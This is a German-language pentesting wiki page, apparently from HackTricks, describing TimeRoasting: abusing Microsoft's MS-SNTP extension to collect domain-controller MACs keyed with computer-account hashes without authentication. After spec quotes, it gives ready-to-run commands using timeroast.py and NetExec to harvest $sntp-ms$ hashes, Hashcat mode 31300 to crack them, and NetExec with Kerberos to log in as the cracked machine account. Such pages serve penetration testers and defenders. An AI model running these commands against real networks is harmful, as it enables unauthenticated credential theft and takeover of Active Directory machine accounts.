# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting missbraucht die veraltete MS-SNTP authentication extension. In MS-SNTP kann ein Client eine 68-Byte-Anfrage senden, die beliebige Computer-Account-RIDs einbettet; der Domain Controller verwendet den NTLM hash (MD4) des Computerkontos als Schlüssel, um einen MAC über die Antwort zu berechnen und zurückzugeben. Angreifer können diese MS-SNTP MACs ohne Authentifizierung sammeln und offline knacken (Hashcat mode 31300), um die Passwörter von Computerkonten zu ermitteln.

Siehe Abschnitt 3.1.5.1 "Authentication Request Behavior" und 4 "Protocol Examples" in der offiziellen MS-SNTP spec für Details.
![](../../images/Pasted%20image%2020250709114508.png)
Wenn das ExtendedAuthenticatorSupported ADM element false ist, sendet der Client eine 68-Byte-Anfrage und bettet die RID in die 31 niederwertigsten Bits des Key Identifier-Unterfelds des Authenticators ein.

> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.

From section 4 (Protocol Examples):

> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.

Die crypto-checksum ist MD5-basiert (siehe 3.2.5.1.1) und kann offline geknackt werden, wodurch der roasting attack ermöglicht wird.

## Angriffsmethode

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting-Skripte von Tom Tervoort
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Praktischer Angriff (ohne Authentifizierung) mit NetExec + Hashcat

- NetExec kann MS-SNTP MACs für Computer-RIDs ohne Authentifizierung auflisten und sammeln und $sntp-ms$-Hashes ausgeben, die zum Cracken bereit sind:
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline mit Hashcat mode 31300 (MS-SNTP MAC):
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Der wiederhergestellte Klartext entspricht dem Passwort eines Computerkontos. Versuche es direkt als Maschinenkonto mit Kerberos (-k), wenn NTLM deaktiviert ist:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Praktische Hinweise
- Stellen Sie vor der Verwendung von Kerberos eine genaue Zeitsynchronisation sicher: `sudo ntpdate <dc_fqdn>`
- Falls nötig, erzeugen Sie eine krb5.conf für das AD-Realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Ordnen Sie RIDs später mittels LDAP/BloodHound Principals zu, sobald Sie einen authenticated foothold haben.

## Referenzen

- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [NetExec – official docs](https://www.netexec.wiki/)
- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
